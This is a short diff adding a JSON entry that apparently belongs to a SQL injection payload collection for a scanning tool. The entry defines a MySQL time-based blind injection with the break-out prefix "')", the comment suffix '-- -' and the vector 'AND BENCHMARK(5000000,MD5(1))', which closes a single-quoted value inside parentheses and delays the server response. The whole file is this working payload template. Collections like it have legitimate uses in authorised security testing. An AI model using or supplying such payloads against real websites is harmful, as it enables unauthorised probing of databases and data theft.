@@ -1,0 +1,12 @@
+{
+ "dbms": "mysql",
+ "technique": "time",
+ "boundary": {
+  "prefix": "')",
+  "suffix": "-- -",
+  "type": "paren-single",
+  "desc": "single-quoted inside parenthesis"
+ },
+ "vector": "{B} AND BENCHMARK(5000000,MD5(1))",
+ "comment": "mysql time via single-quoted inside parenthesis"
+}
